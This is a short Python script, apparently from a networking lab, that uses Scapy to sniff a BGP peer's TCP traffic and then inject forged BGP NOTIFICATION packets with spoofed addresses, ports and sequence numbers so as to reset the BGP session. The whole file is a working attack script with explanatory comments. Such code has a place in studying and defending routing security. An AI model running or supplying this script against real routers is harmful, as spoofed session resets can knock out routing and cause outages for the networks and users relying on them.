#!/usr/bin/env python3
#Import time so we can set a sleep timer
import time
#Import scapy
from scapy.all import *
#Import BGP
load_contrib('bgp')

#Loop to sniff packets
for i in range (0, 5):
    #Sniff for a BGP packet - change IP address to the right IP address
    pkt = sniff(filter="tcp and ip dst 192.168.1.249",count=1)

    for i in range (0, 10):
        #Create a new Ethernet frame
        frame1=Ether()
        #Set destination MAC address to captured BGP frame
        frame1.dst = pkt[0].dst
        #Set source MAC address to captured BGP frame
        frame1.src = pkt[0].src
        #Set Ethernet Type to captured BGP frame
        frame1.type = pkt[0].type
        #Set destination port to captured BGP packet TCP port number
        mydport = pkt[0].dport
        #Set source port to captured BGP packet TCP port number
        mysport = pkt[0].sport
        #Set sequence number to captured BGP packet + i (loop value)
        seq_num = pkt[0].seq + i
        #Set ack number to captured BGP packet 
        ack_num = pkt[0].ack
        #Set source IP address to captured BGP packet  
        ipsrc = pkt[0][IP].src
        #Set desination IP address to captured BGP packet  
        ipdst = pkt[0][IP].dst
        #Craft notification BGP packet. Type 3 is notification. Marker is a bunch of F's in hex  
        bgp_reset = IP(src=ipsrc, dst=ipdst, ttl=1)\
        /TCP(dport=mydport, sport=mysport, flags="PA", seq=seq_num, ack=ack_num)\
        /BGPHeader(marker=340282366920938463463374607431768211455, len=21,\
        type=3)
        #Send packet into network = frame1 + bgp_reset
        sendp(frame1/bgp_reset)
        frame1.show()
        bgp_reset.show()
        time.sleep(1)


